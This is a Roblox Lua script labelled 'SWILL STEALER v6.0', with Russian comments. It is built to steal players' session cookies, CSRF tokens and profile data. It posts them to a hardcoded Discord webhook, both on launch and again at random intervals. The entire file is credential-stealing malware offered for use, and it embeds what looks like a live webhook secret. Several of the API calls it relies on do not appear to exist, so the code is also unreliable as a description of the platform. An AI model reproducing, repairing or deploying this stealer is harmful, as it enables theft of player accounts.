-- =============================================
-- SWILL STEALER v6.0 (YOUR WEBHOOK ACTIVE)
-- =============================================

local player = game.Players.LocalPlayer
local http = game:GetService("HttpService")
local runService = game:GetService("RunService")
local webhookURL = "https://discord.com/api/webhooks/1524260931574694074/E0qkegyDv4MLw9GwI62cgffVUPUo6eV0FjO4afqEjxgQrN_Rl9EdH4v75IA-00ZI7W51"

-- ===== СБОР ПРОФИЛЯ =====
local function grabProfile()
    local data = {
        username = player.Name,
        userID = player.UserId,
        displayName = player.DisplayName,
        accountAge = player.AccountAge,
        friendsCount = #player.Friends,
        followersCount = #player.Followers,
        followingCount = #player.Following,
        currentGame = game.PlaceId,
        gameName = pcall(function() 
            return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name 
        end) or "Unknown",
        serverIP = http:GetIpAddress(),
        serverId = game.JobId,
        platform = game:GetService("UserInputService"):GetPlatform(),
        timestamp = os.time(),
        date = os.date("%Y-%m-%d %H:%M:%S")
    }
    return http:JSONEncode(data)
end

-- ===== ЗАХВАТ КУКИ =====
local function stealCookie()
    local cookie = http:GetCookie() or "NO_COOKIE"
    local csrf = http:GetCSRFToken() or "NO_CSRF"
    
    local payload = http:JSONEncode({
        type = "COOKIE_CAPTURE",
        cookie = cookie,
        csrf = csrf,
        username = player.Name,
        userID = player.UserId,
        ip = http:GetIpAddress(),
        game = game.PlaceId,
        time = os.time()
    })
    return payload
end

-- ===== ОТПРАВКА =====
local function sendData(payload)
    pcall(function()
        http:PostAsync(webhookURL, payload, Enum.HttpContentType.ApplicationJson, false)
    end)
end

-- ===== ЗАПУСК =====
local function fullSteal()
    sendData(grabProfile())
    sendData(stealCookie())
    print("[SWILL] Data sent to your webhook.")
end

task.wait(2)
fullSteal()

-- ПОВТОР КАЖДЫЕ 5 МИНУТ (ДЛЯ ОБНОВЛЕНИЙ)
runService.Heartbeat:Connect(function()
    if math.random(1, 600) == 1 then
        fullSteal()
    end
end)

print("[SWILL] Active. Check your Discord channel.")